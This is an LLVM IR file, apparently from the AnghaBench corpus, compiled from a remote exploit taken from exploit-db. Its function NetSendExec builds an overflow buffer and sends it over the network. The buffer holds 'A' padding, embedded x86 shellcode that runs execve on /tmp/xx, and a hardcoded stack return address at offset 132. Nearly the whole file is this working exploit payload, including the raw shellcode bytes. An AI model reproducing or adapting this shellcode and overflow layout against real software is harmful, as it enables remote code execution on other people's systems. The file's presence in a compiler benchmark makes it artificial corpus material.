; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19667.c_NetSendExec.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19667.c_NetSendExec.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@CS_MESG_MAX = common dso_local global i32 0, align 4
@CS_DATA_MAX_LEN = common dso_local global i32 0, align 4
@__const.NetSendExec.code = private unnamed_addr constant [46 x i8] c"\EB\1F^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\08\8DV\0C\CD\801\DB\89\D8@\CD\80\E8\DC\FF\FF\FF/tmp/xx\00", align 16
@.str = private unnamed_addr constant [7 x i8] c"%i %s\0A\00", align 1
@CS_CODE_LITERALCMD = common dso_local global i32 0, align 4
@SHELLSTART = common dso_local global i32 0, align 4
@SIZEOFBUF = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @NetSendExec(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca [46 x i8], align 16
  store i8* %0, i8** %2, align 8
  %9 = load i32, i32* @CS_MESG_MAX, align 4
  %10 = zext i32 %9 to i64
  %11 = call i8* @llvm.stacksave()
  store i8* %11, i8** %3, align 8
  %12 = alloca i8, i64 %10, align 16
  store i64 %10, i64* %4, align 8
  %13 = load i32, i32* @CS_DATA_MAX_LEN, align 4
  %14 = zext i32 %13 to i64
  %15 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %5, align 8
  %16 = load i32, i32* @CS_DATA_MAX_LEN, align 4
  %17 = zext i32 %16 to i64
  %18 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %6, align 8
  %19 = bitcast [46 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %19, i8* align 16 getelementptr inbounds ([46 x i8], [46 x i8]* @__const.NetSendExec.code, i32 0, i32 0), i64 46, i1 false)
  %20 = call i32 @memset(i8* %18, i32 65, i32 229)
  %21 = getelementptr inbounds i8, i8* %18, i64 50
  %22 = getelementptr inbounds [46 x i8], [46 x i8]* %8, i64 0, i64 0
  %23 = getelementptr inbounds [46 x i8], [46 x i8]* %8, i64 0, i64 0
  %24 = call i32 @strlen(i8* %23)
  %25 = call i32 @memcpy(i8* %21, i8* %22, i32 %24)
  %26 = getelementptr inbounds i8, i8* %18, i64 132
  store i8 -28, i8* %26, align 4
  %27 = getelementptr inbounds i8, i8* %18, i64 133
  store i8 -21, i8* %27, align 1
  %28 = getelementptr inbounds i8, i8* %18, i64 134
  store i8 -1, i8* %28, align 2
  %29 = getelementptr inbounds i8, i8* %18, i64 135
  store i8 -65, i8* %29, align 1
  %30 = getelementptr inbounds i8, i8* %18, i64 228
  store i8 0, i8* %30, align 4
  %31 = load i32, i32* @CS_MESG_MAX, align 4
  %32 = call i32 @strncpy(i8* %12, i8* %18, i32 %31)
  %33 = load i32, i32* @CS_MESG_MAX, align 4
  %34 = sub nsw i32 %33, 1
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %12, i64 %35
  store i8 0, i8* %36, align 1
  %37 = load i32, i32* @CS_CODE_LITERALCMD, align 4
  %38 = call i32 @sprintf(i8* %15, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i32 %37, i8* %12)
  %39 = call i32 @NetSendData(i8* %15)
  %40 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %40)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @memcpy(i8*, i8*, i32) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @strncpy(i8*, i8*, i32) #3

declare dso_local i32 @sprintf(i8*, i8*, i32, i8*) #3

declare dso_local i32 @NetSendData(i8*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
